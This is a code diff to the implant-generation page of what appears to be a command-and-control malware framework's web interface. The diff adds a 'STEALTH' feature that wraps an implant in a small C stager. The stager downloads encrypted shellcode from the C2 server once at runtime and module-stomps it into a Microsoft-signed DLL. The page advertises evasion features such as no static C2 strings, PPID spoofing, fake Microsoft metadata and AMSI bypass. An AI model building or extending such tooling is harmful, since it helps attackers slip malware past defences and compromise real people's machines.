@@ -103,7 +103,9 @@ export default function Generate() {
   const [terminal, setTerminal] = useState<TermLine[]>([])
   const [running,  setRunning]  = useState(false)
   const [packing,  setPacking]  = useState(false)
-  const [ghosting, setGhosting] = useState(false)
+  const [ghosting,  setGhosting]  = useState(false)
+  const [stealthing,setStealthing]= useState(false)
+  const [stageURL,  setStageURL]  = useState<string | null>(null)
   const [showEvasion, setShowEvasion] = useState(true)
   const termRef = useRef<HTMLDivElement>(null)
 
@@ -250,6 +252,49 @@ export default function Generate() {
   function downloadImplant() {
     if (!result?.path) return
     window.open(`/api/generate/download?path=${encodeURIComponent(result.path)}`, '_blank')
+  }
+
+  // Stealth: C stager compiled with MinGW — zero Go runtime
+  async function stealthImplant() {
+    if (!result?.path) return
+    setStealthing(true)
+    setStageURL(null)
+    setTerminal(prev => [
+      ...prev,
+      { text: '', type: 'info' },
+      { text: '[*] Building C stager (MinGW) — zero Go runtime…', type: 'info' },
+      { text: '[*] Stage 0: ~50KB C binary, no embedded payload, no C2 strings…', type: 'info' },
+      { text: '[*] Stage 1: encrypted shellcode hosted on C2, delivered once at runtime…', type: 'info' },
+    ])
+    try {
+      const res = await apiPost<{ path: string; stage_url: string; message: string }>('/api/generate/stealth', {
+        binary_path:  result.path,
+        implant_name: name.trim() || 'implant',
+        is_shellcode: format === 'bin',
+        c2_host:      c2host.trim(),
+        c2_port:      c2port,
+        use_tls:      protocol === 'https',
+      })
+      setResult(prev => prev ? { ...prev, path: res.path, message: res.message } : null)
+      setStageURL(res.stage_url)
+      setTerminal(prev => [
+        ...prev,
+        { text: `[+] C stager: ${res.path}`, type: 'ok' },
+        { text: `[+] Stage URL (one-shot): ${res.stage_url}`, type: 'ok' },
+        { text: '[+] Static: no Go runtime, no payload, no C2 address = CLEAN', type: 'ok' },
+        { text: '[+] Runtime: downloads + module-stomps shellcode in MS-signed DLL', type: 'ok' },
+        { text: '[!] Requires shellcode format (--format shellcode) for best results', type: 'info' },
+      ])
+    } catch (e) {
+      const msg = String(e)
+      setTerminal(prev => [
+        ...prev,
+        { text: `[-] Stealth failed: ${msg}`, type: 'err' },
+        ...(msg.includes('mingw') ? [
+          { text: '[!] Fix: sudo apt install mingw-w64  (on the C2 Pi)', type: 'err' as const },
+        ] : []),
+      ])
+    } finally { setStealthing(false) }
   }
 
   // Ghost: Module Stomping + PPID Spoof + PE fake metadata + AES
@@ -518,6 +563,24 @@ export default function Generate() {
                 <span style={{ fontSize: 10 }}>Execute</span>
               </button>
 
+              {/* STEALTH: C stager — zero Go runtime, max bypass */}
+              {result.path && os === 'windows' && (
+                <button onClick={stealthImplant} disabled={stealthing}
+                  title="C stager (MinGW) — zero Go runtime. Stage 0: ~50KB clean binary. Stage 1: encrypted shellcode served once from C2. Requires: sudo apt install mingw-w64 on Pi."
+                  style={{
+                    display: 'flex', alignItems: 'center', gap: 5,
+                    padding: '6px 12px', borderRadius: 4, fontSize: 10,
+                    fontFamily: 'inherit', fontWeight: 800, cursor: stealthing ? 'wait' : 'pointer',
+                    background: stealthing ? 'rgba(16,185,129,.08)' : 'rgba(16,185,129,.18)',
+                    border: '1px solid rgba(16,185,129,.6)',
+                    color: '#34d399',
+                    letterSpacing: '.04em',
+                  }}>
+                  {stealthing ? <Loader size={11} className="animate-spin" /> : <Shield size={11} />}
+                  {stealthing ? 'Building C…' : '⚡ STEALTH (C)'}
+                </button>
+              )}
+
               {/* Ghost: Module Stomp + PPID Spoof + fake MS metadata */}
               {result.path && os === 'windows' && (
                 <button onClick={ghostImplant} disabled={ghosting}
@@ -638,7 +701,14 @@ export default function Generate() {
               <span className="badge badge-beacon">Format: {activeFmt.label}</span>
               <span className="badge badge-session">Protocol: {protocol}</span>
               <span className="badge badge-session">Mode: {beacon ? 'Beacon' : 'Session'}</span>
-              {evasion.obfuscate    && <span className="badge badge-win">Garble ✓</span>}
+              {stageURL && (
+              <div style={{ width: '100%', marginTop: 4, padding: '6px 8px',
+                background: 'rgba(16,185,129,.08)', border: '1px solid rgba(16,185,129,.3)',
+                borderRadius: 4, fontSize: 9, color: '#34d399', fontFamily: 'monospace' }}>
+                🔗 Stage URL (one-shot): <span style={{ color: '#6ee7b7' }}>{stageURL}</span>
+              </div>
+            )}
+            {evasion.obfuscate    && <span className="badge badge-win">Garble ✓</span>}
               {evasion.auto_escalate && <span className="badge badge-win">AutoRoot ✓</span>}
               {evasion.amsi_bypass && os === 'windows' && <span className="badge badge-win">AMSI ✓</span>}
             </div>
